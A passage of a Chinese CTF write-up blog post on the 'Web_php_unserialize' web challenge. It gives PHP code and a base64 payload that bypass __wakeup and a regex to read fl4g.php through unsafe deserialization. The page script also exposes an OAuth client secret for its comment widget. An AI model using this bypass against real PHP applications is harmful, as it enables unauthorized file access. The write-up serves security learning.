+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'index.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123;</span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = <span class="string">'fl4g.php'</span>;</span><br><span class="line">$d = <span class="keyword">new</span> Demo($file);</span><br><span class="line">$s = serialize($d);</span><br><span class="line"><span class="comment">// O:4:"Demo":1:&#123;s:10:"Demofile";s:8:"fl4g.php";&#125;</span></span><br><span class="line">$s = str_replace(<span class="string">':1:'</span>, <span class="string">':2:'</span>, $s);</span><br><span class="line">$s = str_replace(<span class="string">'O:4'</span>, <span class="string">'O:+4'</span>, $s);</span><br><span class="line">print_r($s);</span><br><span class="line">print_r(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">print_r(base64_encode($s));</span><br></pre></td></tr></table></figure>
+
+<p>使用了 <code>str_replace</code> 方法来进行替换</p>
+<p>这样编码后的结果就还是带有 <code>%00</code> 的了：</p>
+<p><code>TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code></p>
+<p><img src="http://markdown.yeek.top/20200212005224.png" alt=""></p>
+<p>载荷</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?var&#x3D;TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://markdown.yeek.top/20200212005244.png" alt=""></p>
+<h2 id="0x02-技术总结"><a href="#0x02-技术总结" class="headerlink" title="0x02 - 技术总结"></a>0x02 - 技术总结</h2><ol>
+<li>__wakeup 方法是反序列化后调用的方法，可以利用<strong>超属性</strong>的方法来绕过</li>
+<li>在 php 中 <code>4</code> = <code>+4</code> ，可以用来绕过正则匹配</li>
+<li>私有属性序列化后会在属性名前加上类名，类名左右会带上 <code>%00</code> </li>
+</ol>
+<h2 id="0x03-参考链接："><a href="#0x03-参考链接：" class="headerlink" title="0x03 - 参考链接："></a>0x03 - 参考链接：</h2><p><a href="https://blog.csdn.net/a3320315/article/details/101406818" target="_blank" rel="noopener">攻防世界 Web_php_unserialize的坑</a></p>
+<p><a href="https://blog.csdn.net/qq_35958788/article/details/82975885" target="_blank" rel="noopener">php 序列化与反序列化</a></p>
+<p><a href="https://blog.spoock.com/2016/11/03/php-wakeup/" target="_blank" rel="noopener">__wakeup()函数漏洞以及实际漏洞分析</a></p>
+<p><a href="https://blog.csdn.net/qq_40884727/article/details/101162105" target="_blank" rel="noopener">[wp] 攻防世界 Web_php_unserialize</a></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>莫居尘 Moreant
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://moreant.github.io/post/60542.html" title="攻防世界 WEB Web_php_unserialize">http://moreant.github.io/post/60542.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" rel="tag"><i class="fa fa-tag"></i> 信息安全</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/post/1528.html" rel="prev" title="CentOS-使用秘钥登录">
+      <i class="fa fa-chevron-left"></i> CentOS-使用秘钥登录
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/post/44597.html" rel="next" title="攻防世界-WEB-Web-php-unserialize6">
+      攻防世界-WEB-Web-php-unserialize6 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-题目描述"><span class="nav-number">1.</span> <span class="nav-text">0x00 - 题目描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-解题过程"><span class="nav-number">2.</span> <span class="nav-text">0x01 - 解题过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码审计"><span class="nav-number">2.1.</span> <span class="nav-text">代码审计</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#序列化和反序列化"><span class="nav-number">2.2.</span> <span class="nav-text">序列化和反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取-flag"><span class="nav-number">2.3.</span> <span class="nav-text">获取 flag</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#构造-序列化"><span class="nav-number">2.3.1.</span> <span class="nav-text">构造 序列化</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#绕过正则匹配"><span class="nav-number">2.3.2.</span> <span class="nav-text">绕过正则匹配</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用漏洞，绕过-wakeup"><span class="nav-number">2.3.3.</span> <span class="nav-text">利用漏洞，绕过 __wakeup</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#巨坑-私有属性"><span class="nav-number">2.3.4.</span> <span class="nav-text">巨坑-私有属性</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-技术总结"><span class="nav-number">3.</span> <span class="nav-text">0x02 - 技术总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-参考链接："><span class="nav-number">4.</span> <span class="nav-text">0x03 - 参考链接：</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="莫居尘 Moreant"
+      src="http://markdown.yeek.top/bolg/20191029/b8Ytj5Mons6f.jpg?imageslim">
+  <p class="site-author-name" itemprop="name">莫居尘 Moreant</p>
+  <div class="site-description" itemprop="description">别教了，我学不动了</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/moreant" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;moreant" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:moreant@foxmail.com" title="E-Mail → mailto:moreant@foxmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://www.yeek.top/" title="http:&#x2F;&#x2F;www.yeek.top" rel="noopener" target="_blank">Yeek</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://drive.yeek.top/" title="http:&#x2F;&#x2F;drive.yeek.top" rel="noopener" target="_blank">Drive</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">莫居尘 Moreant</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">49k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">45 分钟</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v4.2.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.7.0
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/medium-zoom@1/dist/medium-zoom.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID: '95d6df1a949eeea73df4',
+      clientSecret: '8f06d7871c1db329f5339e191c5269699f4f5d3f',
+      repo: 'moreant.github.io',
+      owner: 'moreant',
+      admin: ['moreant'],
+      id: '37cf901b862b6f403dd09f67e9357983',
+        language: 'zh-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
